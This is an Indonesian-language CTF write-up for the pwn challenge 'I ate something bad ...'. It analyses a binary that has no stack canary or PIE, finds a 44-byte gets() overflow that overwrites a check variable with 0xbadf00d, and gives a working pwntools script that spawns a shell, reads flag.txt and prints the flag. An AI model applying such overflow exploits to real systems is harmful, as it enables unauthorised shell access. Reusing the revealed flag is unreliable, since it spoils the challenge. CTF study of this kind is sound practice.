# Writeup CTF PWN — I ate something bad ...

## Informasi Challenge

**Judul:** I ate something bad ...
**Kategori:** PWN / Buffer Overflow

**Connection:**

```bash
nc chal.thjcc.org 11037
```

Deskripsi:

> Give me some food, but don't give me bad food.

Dari deskripsi terlihat ada kemungkinan konsep "memberi makanan" berkaitan dengan input user yang harus dimanipulasi.

---

# Recon Awal

File yang diberikan:

```text
chal
Dockerfile
docker-compose.yml
flag.txt
```

Cek proteksi binary:

```bash
checksec chal
```

Hasil:

```text
Arch:       amd64-64-little
RELRO:      No RELRO
Canary:     No canary found
PIE:        No PIE
Stack:      Executable
RWX:        Has RWX segments
```

Proteksi yang tidak aktif:

* Tidak ada stack canary
* Tidak ada PIE
* Tidak ada RELRO

Hal ini menunjukkan kemungkinan eksploitasi buffer overflow cukup mudah.

---

# Analisis Binary

Dari `strings` ditemukan beberapa string menarik:

```text
what do you want to eat?
Why you eat this food?
/bin/sh
yammy it is not bad food!
```

Terdapat juga fungsi:

```text
gets
system
```

Kombinasi `gets()` dan `system()` merupakan indikasi adanya buffer overflow yang dapat mengubah variabel atau kontrol program.

---

# Analisis Fungsi Utama

Karena binary tidak memiliki symbol `main`, entry point memanggil fungsi utama pada:

```text
0x401156
```

Disassembly:

```asm
push rbp
mov rbp,rsp
sub rsp,0x30
```

Program membuat stack frame sebesar:

```text
0x30 byte
```

Kemudian terdapat variabel:

```asm
mov dword [rbp-4],0
```

Variabel ini awalnya bernilai:

```text
0
```

Input user diterima menggunakan:

```asm
lea rax,[rbp-0x30]
mov rdi,rax
call gets
```

Artinya input disimpan pada buffer:

```text
rbp-0x30
```

---

# Menemukan Overflow

Setelah input diterima, program melakukan pengecekan:

```asm
cmp dword [rbp-4],0xbadf00d
jne fail
```

Agar program masuk ke kondisi sukses, kita harus mengubah nilai:

```text
rbp-4
```

menjadi:

```text
0xbadf00d
```

Jarak antara buffer dan target:

```text
buffer  = rbp-0x30
target  = rbp-0x4

0x30 - 0x4 = 0x2c
```

Jadi dibutuhkan:

```text
44 byte padding
```

Layout payload:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ 
0xbadf00d
```

Karena sistem menggunakan little endian:

```python
p32(0x0badf00d)
```

menghasilkan:

```text
0d f0 ad 0b
```

---

# Trigger Shell

Jika nilai variabel berhasil diubah, program menjalankan:

```asm
lea rax,str./bin/sh
mov rdi,rax
call system
```

Sehingga program menjalankan:

```bash
/bin/sh
```

---

# Exploit

Exploit menggunakan pwntools:

```python
from pwn import *

io = remote("chal.thjcc.org",11037)

payload = b"A"*44 + p32(0x0badf00d)

io.sendlineafter(
    b"what do you want to eat?",
    payload
)

io.sendline(b"cat flag.txt")

io.shutdown("send")

print(io.recvall().decode())
```

---

# Output

Hasil eksekusi:

```text
Why you eat this food?

THJCC{m4yb3_1_34t_t0_much}
```

---

# Flag

```text
THJCC{m4yb3_1_34t_t0_much}
```

---
